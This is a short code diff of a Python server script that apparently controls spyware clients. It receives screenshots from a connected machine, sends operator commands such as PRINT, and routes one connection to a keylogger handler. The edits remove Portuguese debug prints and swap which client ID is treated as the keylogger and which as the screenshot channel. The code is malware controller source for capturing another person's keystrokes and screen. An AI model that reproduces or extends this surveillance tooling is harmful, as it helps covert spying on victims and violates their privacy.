@@ -8,7 +8,6 @@ def receive_prt_sc(client, n):
     with open(screenshot, 'wb') as file:
         while True:
             data = client.recv(1024)
-            print('recebi ', data)
             if not data:
                 break
             if b'END_FILE' in data:
@@ -20,9 +19,7 @@ def handle_print_screen(client):
     n = 0
     while True:
         while True:
-            print('digite seu comando')
             request = input()
-            print('vou enviar ', request)
             client.send(request.encode('utf-8'))
             if request == 'PRINT':
                 receive_prt_sc(client, n)
@@ -56,10 +53,10 @@ def handle_keylogger(client):
 
 def handle_clients(client, id):
     # FIRST TO CONNECT: KEYLOGGER
-    KEYLOGGER = 1
+    KEYLOGGER = 0
     
     # SECOND TO CONNECT: PRINTSCREEN
-    PRINTSCREEN = 0
+    PRINTSCREEN = 1
 
     if id == KEYLOGGER:
         handle_keylogger(client)
